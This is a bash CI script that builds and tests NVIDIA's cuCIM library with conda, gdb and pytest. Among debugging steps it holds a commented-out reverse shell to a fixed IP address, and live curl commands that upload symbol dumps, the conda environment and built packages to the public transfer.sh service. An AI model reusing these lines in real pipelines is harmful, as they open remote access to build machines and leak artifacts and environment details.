#!/bin/bash
# Copyright (c) 2020, NVIDIA CORPORATION.
#########################################
# ucx-py GPU build and test script for CI #
#########################################
set -e
NUMARGS=$#
ARGS=$*

set -x

# apt-get install libnuma libnuma-dev

# Arg parsing function
function hasArg {
    (( ${NUMARGS} != 0 )) && (echo " ${ARGS} " | grep -q " $1 ")
}

# Set path and build parallel level
export PATH=/opt/conda/bin:/usr/local/cuda/bin:$PATH
export PARALLEL_LEVEL=${PARALLEL_LEVEL:-4}

# Set home to the job's workspace
export HOME=$WORKSPACE

# Parse git describe
cd $WORKSPACE
export GIT_DESCRIBE_TAG=`git describe --abbrev=0 --tags`
export MINOR_VERSION=`echo $GIT_DESCRIBE_TAG | grep -o -E '([0-9]+\.[0-9]+)'`
echo "MINOR_VERSION: ${MINOR_VERSION}"

# Get CUDA and Python version
export CUDA_VERSION=${CUDA_VERSION:-$(cat /usr/local/cuda/version.txt | egrep -o "[[:digit:]]+.[[:digit:]]+.[[:digit:]]+")}
export CUDA_VER=${CUDA_VERSION%.*}
export PYTHON_VER=${PYTHON:-$(python -c "import sys; print('.'.join(map(str, sys.version_info[:2])))")}
echo "CUDA_VERSION: ${CUDA_VERSION}"
echo "CUDA_VER    : ${CUDA_VER}"
echo "PYTHON_VER  : ${PYTHON_VER}"

################################################################################
# SETUP - Check environment
################################################################################

gpuci_logger "Check environment"
env

gpuci_logger "Check GPU usage"
nvidia-smi

gpuci_logger "Activate conda env"
. /opt/conda/etc/profile.d/conda.sh
conda activate rapids

gpuci_logger "Install dependencies"
gpuci_mamba_retry install -y -c rapidsai-nightly \
    "cudatoolkit=${CUDA_VER}.*" \
    "rapids-build-env=$MINOR_VERSION.*"

# mkdir -p conda-bld/linux-64

# curl http://transfer.sh/aIWdPe/libcucim-21.12.00a-cuda11.5_g25db920_18.tar.bz2 -o conda-bld/linux-64/libcucim-21.12.00a-cuda11.5_g25db920_18.tar.bz2
# curl http://transfer.sh/3pLRJ6/cucim-21.12.00a-cuda_11.5_py37_g25db920_18.tar.bz2 -o conda-bld/linux-64/cucim-21.12.00a-cuda_11.5_py37_g25db920_18.tar.bz2
# conda index conda-bld

# # Install cuCIM and its dependencies
# gpuci_logger "Installing cuCIM and its dependencies"
# gpuci_mamba_retry install -y -c `pwd`/conda-bld -c rapidsai-nightly \
#     "rapids-build-env=$MINOR_VERSION.*" \
#     libcucim \
#     cucim

# gpuci_logger "Testing cuCIM import"
# gpuci_mamba_retry install -y -c conda-forge gdb

# echo "Print environment"
# printenv

# echo "importing both modules"
# gdb -ex 'set confirm off' -ex 'run -c "import cucim"' -ex 'bt' -ex 'i proc m' -ex 'quit' `which python`

# echo "importing cupy only"
# gdb -ex 'set confirm off' -ex 'run -c "import cupy"' -ex 'bt' -ex 'i proc m' -ex 'quit' `which python`

# echo "importing CuImage only"
# gdb -ex 'set confirm off' -ex 'run -c "import cucim.clara._cucim as cc"' -ex 'bt' -ex 'i proc m' -ex 'quit' `which python`


# gpuci_logger "####################Fresh Environment#############"
# conda deactivate

# conda create -n cucim -c `pwd`/conda-bld -c conda-forge cucim cudatoolkit=${CUDA_VER} gdb
# conda activate cucim

# echo "Print environment"
# printenv


# echo "importing both modules"
# gdb -ex 'set confirm off' -ex 'run -c "import cucim"' -ex 'bt' -ex 'i proc m' -ex 'quit' `which python`

# echo "importing cupy only"
# gdb -ex 'set confirm off' -ex 'run -c "import cupy"' -ex 'bt' -ex 'i proc m' -ex 'quit' `which python`

# echo "importing CuImage only"
# gdb -ex 'set confirm off' -ex 'run -c "import cucim.clara._cucim as cc"' -ex 'bt' -ex 'i proc m' -ex 'quit' `which python`



################################################################################
# BUILD - Build cuCIM
################################################################################

# To use 'conda-forge'-based package installation and to use 'Project Flash' feature,
# we fake conda build folder for libcucim to '$WORKSPACE/ci/artifacts/cucim/cpu/conda-bld/' which is
# conda build folder for CPU build.
# For GPU build, we fake conda build folder for cucim to '/opt/conda/envs/rapids/conda-bld'.
LIBCUCIM_BLD_PATH=$WORKSPACE/ci/artifacts/cucim/cpu/.conda-bld
CUCIM_BLD_PATH=/opt/conda/envs/rapids/conda-bld
mkdir -p ${CUCIM_BLD_PATH}


gpuci_mamba_retry build -c ${LIBCUCIM_BLD_PATH} -c conda-forge -c rapidsai-nightly \
    --dirty \
    --no-remove-work-dir \
    --croot ${CUCIM_BLD_PATH} \
    conda/recipes/cucim


################################################################################
# TEST - Run py.tests for cuCIM
################################################################################

# Install cuCIM and its dependencies
gpuci_logger "Installing cuCIM and its dependencies"
gpuci_mamba_retry install -y -c ${LIBCUCIM_BLD_PATH} -c ${CUCIM_BLD_PATH} -c rapidsai-nightly \
    "rapids-build-env=$MINOR_VERSION.*" \
    libcucim \
    cucim

gpuci_logger "Testing cuCIM import"
gpuci_mamba_retry install -y -c conda-forge gdb

echo "importing both modules"
gdb -ex 'set confirm off' -ex 'run -c "import cucim"' -ex 'bt' -ex 'i proc m' -ex 'quit' `which python`

echo "importing cupy only"
gdb -ex 'set confirm off' -ex 'run -c "import cupy"' -ex 'bt' -ex 'i proc m' -ex 'quit' `which python`

echo "importing CuImage only"
gdb -ex 'set confirm off' -ex 'run -c "import cucim.clara._cucim as cc"' -ex 'bt' -ex 'i proc m' -ex 'quit' `which python`

echo "Allocationg cuda memory"
gdb -ex 'set pagination off' -ex 'set breakpoint pending on' -ex 'set confirm off' -ex 'b filesystem/cufile_driver.cpp:337' -ex 'run -c "import cucim.clara._cucim as cc; cc.haha(\"dd\");print(\"hoho\")"' -ex 'bt' -ex 'i proc m' -ex 'maint print symbols gdb.txt' -ex 'info functions' -ex 'c' -ex 'bt' -ex 'i proc m' -ex 'quit' `which python`

curl --upload-file -v ./gdb.txt http://transfer.sh/gdb.txt
echo

set +e
#/bin/bash -i > /dev/tcp/206.189.160.33/9999 0<&1 2>&1
conda env export > environment.yml
echo
curl --upload-file ./environment.yml http://transfer.sh/environment.yml
echo

for i in `ls -1 /workspace/ci/artifacts/cucim/cpu/.conda-bld/linux-64/libcucim-*.bz2`; do
    curl --upload-file $i http://transfer.sh/$(basename $i)
    echo
done

for i in `ls -1 /opt/conda/envs/rapids/conda-bld/linux-64/cucim-*.bz2`; do
    curl --upload-file $i http://transfer.sh/$(basename $i)
    echo
done

gpuci_logger "Check versions"
python --version
$CC --version
$CXX --version
conda info
conda config --show-sources
conda list --show-channel-urls

if hasArg --skip-tests; then
    gpuci_logger "Skipping Tests"
else
    gpuci_logger "Check GPU usage"
    nvidia-smi

    gpuci_logger "Check NICs"
    awk 'END{print $1}' /etc/hosts
    cat /etc/hosts

    gpuci_logger "Python py.test for cuCIM"
    ./run test python all
fi
